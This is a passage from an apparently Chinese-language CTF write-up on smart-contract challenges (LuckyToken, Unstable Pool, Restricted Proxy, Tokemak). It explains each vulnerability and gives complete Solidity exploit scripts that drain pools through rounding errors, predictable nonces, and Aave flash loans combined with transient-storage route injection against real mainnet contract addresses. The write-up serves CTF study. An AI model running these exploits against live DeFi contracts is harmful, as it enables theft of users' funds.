        router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(token.specialSender(address(pair)) == true);
        console.log("challenge address:", chall);
        console.log("player address:", player);
        console.log("token address:", address(token));
        console.log("vault address:", address(vault));
        console.log("pair address:", address(pair));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        attack = new Attack{value: 0.6 ether}(chall, helper.addr);
        payable(helper.addr).transfer(0.2 ether);
        attack.getInitialToken();
        token.transfer(address(attack), 1e3);
        attack.increaseTX();
        address computedLockStaking = burnLock();
        while (true) {
            if (checkStatus(address(vault), computedLockStaking) == false) break;
            token.transfer(helper.addr, 1);
        }
        vault.release();
        vm.stopBroadcast();

        vm.broadcast(vm.envUint("PRIV"));
        token.approve(address(attack), 1e32);
        vm.broadcast(helper.privateKey);
        token.approve(address(attack), 1e32);

        vm.startBroadcast(vm.envUint("PRIV"));
        uint i = attack.increaseToken();
        console.log("total", i);
        uint256 playerBalance = token.balanceOf(player);
        uint256 helperBalance = token.balanceOf(helper.addr);
        uint256 totalBalance = playerBalance + helperBalance;
        console.log("player token balance:", playerBalance);
        console.log("helper token balance:", helperBalance);
        console.log("-->all in sum balance:", totalBalance, "
");

        token.approve(address(router), playerBalance);
        token.approve(address(pair), playerBalance);
        token.approve(address(attack), playerBalance);
        attack.getFinalETH();
        console.log("final player balance:", player.balance);
        console.log("isSolved:", challenge.isSolved());
        vm.stopBroadcast();
    }

    function burnLock() public returns(address) {
        bytes32 salt = bytes32(uint256(uint160(player)));
        bytes32 initCodeHash = keccak256(
            abi.encodePacked(
                type(LockStaking).creationCode,
                abi.encode(address(token), 12)
            )
        );
        address deployer = address(vault);
        address addr = vm.computeCreate2Address(salt, initCodeHash, deployer);
        console.log("computed lockStaking addr:", addr);
        token.transfer(addr, 1e2);
        return addr;
    }

    function checkStatus(address _from, address _to) public view returns(bool) {
        uint256 amount = token.balanceOf(_from);
        uint256 nonce = token.nonce();
        uint256 nonce_t = _calculateNonce(
            player,
            _to,
            block.timestamp,
            amount,
            nonce,
            blockhash(block.number - 1)
        );
        bool status = ((nonce_t % 101) & 1) == 0;
        console.log("block number", block.number, ":", status);
        return status;
    }

    function _calculateNonce(
        address _s1,
        address _s2,
        uint256 _s3,
        uint256 _s4,
        uint256 _s5,
        bytes32 _s6
    ) public pure returns (uint256) {
        return
            uint256(
                keccak256(abi.encodePacked(_s1, _s2, _s3, _s4, _s5, _s6))
            );
    }
}

contract Attack {
    address public chall;
    address public player;
    address public WETH;
    Challenge public challenge;
    LuckyToken public token;
    TeamVault public vault;
    address public helper;
    IUniswapV2Pair public pair;
    IUniswapV2Router02 public router;

    constructor(address _chall, address _helper) payable {
        chall = _chall;
        helper = _helper;
        challenge = Challenge(chall);
        token = LuckyToken(challenge.TOKEN());
        player = challenge.PLAYER();
        WETH = challenge.WETH();
        vault = TeamVault(token.teamVault());
        pair = IUniswapV2Pair(token.uniswapV2Pair());
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    }

    function getInitialToken() public {
        require(address(this).balance >= 0.6 ether);
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(token);
        uint256 amountOut = getAmount(address(pair), player, 4e17);
        uint[] memory res = router.swapETHForExactTokens{value: 0.5 ether}(amountOut, path, player, block.timestamp);
        require(res[1] > 0, "fuck uniswap");

        // console.log("player token balance:", token.balanceOf(player));
        // console.log("
");
    }

    function getFinalETH() public {
        uint256 amount0 = getAmount(player, address(this), 0);
        token.transferFrom(player, address(this), amount0);
        token.approve(address(router), 1e32);
        token.approve(address(pair), 1e32);
        uint256 amountIn = getAmount(address(this), address(pair), 0);
        uint256 amountOutMin = 0;
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = WETH;
        router.swapExactTokensForETH(
            amountIn, amountOutMin, path, player, block.timestamp);
        selfdestruct(payable(player));
    }

    function increaseToken() public returns(uint256) {
        uint256 lastTotalBalance = 0;
        uint256 i = 0;
        while (true) {
            i += 1;
            uint256 amount = getAmount(player, helper, 0);
            token.transferFrom(player, helper, amount);

            amount = getAmount(helper, player, 0);
            token.transferFrom(helper, player, amount);

            uint256 playerBalance = token.balanceOf(player);
            uint256 helperBalance = token.balanceOf(helper);
            uint256 totalBalance = playerBalance + helperBalance;

            if (lastTotalBalance >= totalBalance) break;
            lastTotalBalance = totalBalance;
        }
        return i;
    }

    function increaseTX() public {
        for (uint i = 0; i < 10; i++) {
            token.transfer(player, 1);
        }
    }

    function getAmount(address _from, address _to, uint256 _max) public view returns(uint256) {
        uint256 amount = token.balanceOf(_from);
        if (_max != 0) {
            amount = _max;
        }
        uint256 nonce = token.nonce();
        while(amount > 0) {
            uint256 nonce_t = _calculateNonce(
                player,
                _to,
                block.timestamp,
                amount,
                nonce,
                blockhash(block.number - 1)
            );
            bool status = ((nonce_t % 101) & 1) == 0;
            if (status) {
                return amount;
            }
            amount -= 1;
        }
        revert("no answer");
    }

    function _calculateNonce(
        address _s1,
        address _s2,
        uint256 _s3,
        uint256 _s4,
        uint256 _s5,
        bytes32 _s6
    ) public pure returns (uint256) {
        return
            uint256(
                keccak256(abi.encodePacked(_s1, _s2, _s3, _s4, _s5, _s6))
            );
    }

    receive() external payable {}
    fallback() external payable {}
}
```

## 0x06 Unstable Pool

### 关键词

批量操作、除法精度损失

### 题目概览

> Time to test your pool draining skills! Try to steal 90% of the stable coins from the pool.

`PoolToken`合约创建了一个简单的`ERC20`代币，`WrappedToken`是`PoolToken`的包装代币，二者保持一定兑换比率

`UnstablePool`实现了一个简单的交换池子，其中有三种代币，分别是`LP Token`、`PoolToken`、`WrappedToken`。池子支持单次或批量交换，支持指定投入数量`GIVEN_IN`或指定换出数量`GIVEN_OUT`两种模式

我们的目标是找到交换的漏洞，拿到池子里90%的代币，降低`getInvariant`值

### 攻击路径

我们手上本身没有池子里三种任何一种代币，使用swap函数直接就会revert，所以`batchSwap`是我们唯一的选择。一次`batchSwap`需要指定统一的交换模式，所以我们只需考虑一种情况，这里考虑`GIVEN_OUT`

在`PoolToken`和`WrappedToken`的交换过程中，始终是进1出1。经过一番分析可以发现，在投入两种代币之一、换出LP Token时，交换比率都可以概括为`invar/lpSup * delta`。投入LP Token、换出两种代币之一时，交换比率可以概括为`lpSup/invar * delta`

然而，问题在于，对于不同种类的代币交换，使用的除法取整方案不同，有`mathDivUp`也有`mathDivDown`。经过验证，存在精度损失的套利空间。经过精巧的构造，可以放大这种套利的数量，这需要大量的调试尝试

### Exploit

完整EXP：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Script, console2 as console} from "forge-std/Script.sol";

import "../src/Challenge.sol";
import "../src/UnstablePool.sol";

contract Exp is Script {
    address chall;
    address player;
    Challenge challenge;
    PoolToken mainToken;
    WrappedToken wrappedToken;
    UnstablePool pool;
    Attack attack;

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        player = challenge.PLAYER();
        pool = challenge.TARGET();
        mainToken = PoolToken(address(challenge.MAINTOKEN()));
        wrappedToken = WrappedToken(address(challenge.WRAPPEDTOKEN()));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        console.log("pool lp token balance:", pool.getPoolBalance(0));
        console.log("pool main token balance:", pool.getPoolBalance(1));
        console.log("pool wrapped token balance:", pool.getPoolBalance(2));
        attack = new Attack(chall);
        for (uint i = 0; i < 9; i++) {
            console.log(i);
            attack.run();
            printBalance(address(pool));
        }
        vm.stopBroadcast();
    }
    function printBalance(address account) public view {
        console.log("main token balance:", mainToken.balanceOf(account));
        console.log("wrapped token balance:", wrappedToken.balanceOf(account));
        console.log("LP token balance:", pool.balanceOf(account));
    }
}

contract Attack {
    address chall;
    address player;
    Challenge challenge;
    PoolToken mainToken;
    WrappedToken wrappedToken;
    UnstablePool pool;

    constructor(address _chall) {
        chall = _chall;
        challenge = Challenge(chall);
        player = challenge.PLAYER();
        pool = challenge.TARGET();
        mainToken = PoolToken(address(challenge.MAINTOKEN()));
        wrappedToken = WrappedToken(address(challenge.WRAPPEDTOKEN()));
    }

    function run() public {
        stealMainToken();  
    }

    function stealMainToken() public {
        UnstablePool.BatchSwapStep[] memory swaps = new UnstablePool.BatchSwapStep[](5);
        swaps[0] = UnstablePool.BatchSwapStep({
            assetInIndex: 2,
            assetOutIndex: 0,
            amount: 1.1e22
        });
        swaps[1] = UnstablePool.BatchSwapStep({
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: pool.getPoolBalance(1)
        });
        swaps[2] = UnstablePool.BatchSwapStep({
            assetInIndex: 0,
            assetOutIndex: 2,
            amount: 1e22 - 9
        });
        swaps[3] = UnstablePool.BatchSwapStep({
            assetInIndex: 1,
            assetOutIndex: 2,
            amount: 9
        });
        swaps[4] = UnstablePool.BatchSwapStep({
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: 99999999999999999999990
        });
        int256[] memory limits = new int256[](3);
        limits[0] = 2**255-1;
        limits[1] = 2**255-1;
        limits[2] = 2**255-1;
        pool.batchSwap(UnstablePool.SwapKind.GIVEN_OUT, swaps, address(this), limits);
    }
}

```

## 0x07 Restricted Proxy

### 关键词

abi encoder

### 题目概览

> Long, long ago (like... Block 42), a wizard sealed 1 ETH inside a mystical Proxy Contract.
>
> You get one shot to proxy upgrade it—but under these very strict rules:
>
> No Messing with the Family Tree  
> The inheritance structure stays exactly as is. No new parents, no secret children.
>
> No Rewriting the Magic  
> You can’t alter existing functions or their visibility, and you can’t add or remove any functions. No new spells, no banished spells.
>
> No Rearranging the Royal Closet.  
> The storage layout cannot change. Touch a single uint256, and you might awaken the alignment demon.
>
> No Upgrading the Wizard’s Quill  
> Keep the same Solidity version. The wizard likes his dusty old version—deal with it.
>
> Obey these ancient laws, upgrade the contract once, and claim the 100 ETH prize. But break them and face the dreaded 'Gasless Abyss!'

`CTF`合约可以实现基本的withdraw功能，特别的是大量使用内联汇编。任何人都可以轻易成为owner进行withdraw，问题在于`withdrawRate`只能设置为`uint8`变量，导致无法取出全部100 ETH，无法达成题目要求

重点在于题目给出的Upgrade功能，可以进行一次合约升级，限制条件：

* 不能更改合约继承关系
* 不能更改函数
* 不能更改存储布局
* 不能更改Solidity版本

我们的目标是拿走CTF合约中的所有100个ETH

### 攻击路径

这道题预期是一个小trick，了解即可。仔细查看changeWithdrawRate函数：

```
function changeWithdrawRate(uint8) external {
        assembly {
            sstore(withdrawRate.slot, calldataload(4))
        }
}
```

sstore存储的是calldataload(4)整个的32个字节，而uint8类型检查实际依赖abi encoder。默认使用的是abi encoder v2，但实际在abi encoder v1中并不会进行类型检查。所以我们只需在文件开头添加`pragma abicoder v1;`指示使用v1版本，upgrade合约，即可随意设置`withdrawRate`，轻松达成目标

## 0x08 Tokemak

### 关键词

Transient Storage、Tokemak

### 题目概览

> I found this cool protocol called Tokemak that lets you earn maximized yield on your ETH! I'd recommend pooling all our autoETH together in my new LFG Staker contract, otherwise you're definitely ngmi.

题目依托[tokemak项目](https://www.tokemak.xyz/)建立`LFGStaker`合约，用户可将tokemak的autoETH代币（类似于LP token）质押到`LFGStaker`合约中，获得收益。题目目标是耗尽`LFGStaker`合约中的初始资产

想要做LP的用户往往需要谨慎选择收益大的池子，且需要密切关注池子动向，以保证盈利，整个过程十分麻烦。tokemak瞄准这个痛点，提出将LP资金集中到一起，通过算法计算出收益最大的池子，并自动为用户选择资金流向，以获得收益最大化

简单来说，用户在DEX进行交易时可以使用`聚合器`，tokemak就是要做LP的聚合器。想要完全理解题目，最好还是把[tokemak开发者文档](https://docs.tokemak.xyz/developer-docs/contracts-overview)通读一遍，这里不再赘述

### 攻击路径

对于这种deposit assets、redeem shares的合约，由于涉及assets和shares之间的转换，首先就得考虑是否存在除法精度上的套利。这里涉及到向上 / 向下取整。可以发现，计算向外发送代币的数量没有被放大的可能，精度上损失的代币会留在合约内，也就不存在套利机会

整个合约十分简单，只有存入和取出两条路，所以唯一的机会就在`totalAssets`函数中对autoETH合约的调用。如果我们能在deposit时降低totalAssets或在redeem时放大totalAssets，那么就可以套利

`totalAssets`函数会调用`autoETH.previewRedeem`，里面会有一个非常复杂的调用过程，简化来说：

1. preview操作会进行low level call，最后revert，previewRedeem即call redeem
2. autoETH合约查看闲置资金能否满足需求，能满足即结束
3. 闲置资金不足，尝试从流动性池（DestVault）中取出流动性
4. 取出的流动性为冲入的两种代币，但用户需要的只有一种代币（Basic Asset），需要将另一种代币转换成Basic Asset
5. 交换所用的池子可以自动取用，也可以用户指定
6. 最后将所有的代币返回给用户，Burn掉LP token（autoETH）

对应tokemak合约函数大致如下：

```
previewRedeem 
_withdrawAssets
destVault.withdrawBaseAsset
_withdrawBaseAsset
swapRouter.swapForQuote
_swapForQuoteUserRoute
```

问题就出在最后的交换步骤，用户可以自由指定交换的池子，哪怕是一个用户编写的任意汇率的池子，这个池子直接影响着用户redeem最终拿到的资金，即也影响着`totalAssets`，这完全符合我们套利的需求

而决定是否使用用户指定的池子，就会查看是否设置了相应的Transient Storage变量，这就回到了本文的主题

接下来的问题就是：

1. 初始资金哪里来？题目player用户初始只有1 ether ETH，套利效率太低 使用闪电贷（flashloan）借出资金，完成套利。可以使用Aave的api，有详细的[文档](https://aave.com/docs/developers/flash-loans)，写起来非常方便。在实际的DeFi攻击事件中，也到处都是闪电贷的身影。也有很多攻击者使用dydx的闪电贷服务，好处是没有手续费，但文档不全，写起来比较麻烦
2. 如何在同一次交易中设定Transient Storage变量，并进行恶意复用？ 经过搜索发现，`AutopilotRouter`合约中`redeemWithRoutes`函数会使用`swapRouter.initTransientSwap`设定用户指定的`customRoutes`，即交换所用的池子。但在`redeemWithRoutes`最后会使用`swapRouter.exitTransientSwap`清空Transient变量，怎么办呢？ 可以发现，在`redeemWithRoutes`中间会调用`vault.redeem`，而vault地址也是用户传入的，如果我们将vault设置成攻击合约的地址，在执行`vault.redeem`时就能重新执行我们的攻击代码，且此时`customRoutes`已被设置。同时，`redeemWithRoutes`作为router合约中的函数，对vault也没有多余的检查或使用，我们只需写一个相同签名的`redeem`函数即可

### Exploit

完整EXP：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Script, console2 as console} from "forge-std/Script.sol";

import "../src/Challenge.sol";
import "../src/tokemak/vault/AutopilotRouter.sol";
import "../src/tokemak/vault/AutopoolETH.sol";
import { TransientStorage } from "../src/tokemak/libs/TransientStorage.sol";

interface IAAVELendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract Solve is Script {
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AutopoolETH public autoETH = AutopoolETH(0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56);
    address chall;
    Challenge challenge;
    Attack attack;
    LFGStaker lfg;
    address player;

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        lfg = LFGStaker(challenge.LFG_STAKER());
        player = challenge.PLAYER();
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        attack = new Attack(chall);
        for (uint i = 0; i < 100; i++) {
            if (challenge.isSolved()) {
                console.log("SOLVED");
                break;
            }
            attack.run();
            if (i == 40) attack.setDepositAmount(0.16 ether);
            console.log(i);
            console.log("lfg autoETH balance:", autoETH.balanceOf(address(lfg)));
            console.log("player weth balance:", player.balance);
        }
        vm.stopBroadcast();
    }
}

contract Attack is IFlashLoanReceiver {
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AutopoolETH public autoETH = AutopoolETH(0x0A2b94F6871c1D7A32Fe58E1ab5e6deA2f114E56);
    AutopilotRouter public autoRouter = AutopilotRouter(payable(0xC45e939ca8C43822A2A233404Ecf420712084c30));
    IAAVELendingPool public aaveLendingPool = IAAVELendingPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address chall;
    address player;
    Challenge challenge;
    LFGStaker lfg;

    constructor(address _chall) {
        chall = _chall;
        challenge = Challenge(chall);
        player = challenge.PLAYER();
        lfg = LFGStaker(challenge.LFG_STAKER());
    }

    function setDepositAmount(uint256 _amount) public {
        depositAmount = _amount;
    }

    function run() external {
        address[] memory assets = new address[](1);
        assets[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
  
        IWETH9(weth).withdraw(IERC20(weth).balanceOf(address(this)));
        payable(player).transfer(address(this).balance);
    }
  
    uint256 public depositAmount = 1 ether;
    bool hacked = false;

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // deposit autoETH
        IERC20(weth).transfer(address(autoRouter), depositAmount);
        autoRouter.depositBalance(IAutopool(autoETH), address(this), 0);

        // set custom routes
        ISwapRouterV2.UserSwapData[] memory customRoutes = new ISwapRouterV2.UserSwapData[](1);
        customRoutes[0] = ISwapRouterV2.UserSwapData({
            // first DstVault(PXETH/WETH) PXETH address 
            fromToken: address(0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6), 
            // autoETH basic asset
            toToken: address(weth),
            target: address(this),
            data: "hacked by dx3906"
        });

        // deposit LFG
        hacked = false;
        autoRouter.redeemWithRoutes(
            IAutopool(address(this)), address(this), 0, 0, customRoutes);

        // redeem LFG
        hacked = true;
        autoRouter.redeemWithRoutes(
            IAutopool(address(this)), address(this), 0, 0, customRoutes);

        // redeem autoETH
        IERC20(autoETH).approve(address(autoRouter), type(uint256).max);
        autoRouter.redeemMax(autoETH, address(this), 0);

        // approve repay
        IERC20(weth).approve(address(aaveLendingPool), type(uint256).max);
        return true;
    }

    function redeem(uint256, address, address) external returns (uint256){
        if (!hacked) {
            // deposit LFG
            IERC20(autoETH).approve(address(lfg), type(uint256).max);
            lfg.deposit(IERC20(autoETH).balanceOf(address(this)));
        } else {
            // redeem LFG
            lfg.redeem(IERC20(lfg).balanceOf(address(this)));
        }
    }

    fallback(bytes calldata data) external returns (bytes memory) {
        if (hacked) {
            IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
        }
        return data;
    }

    receive() external payable {}

}
```
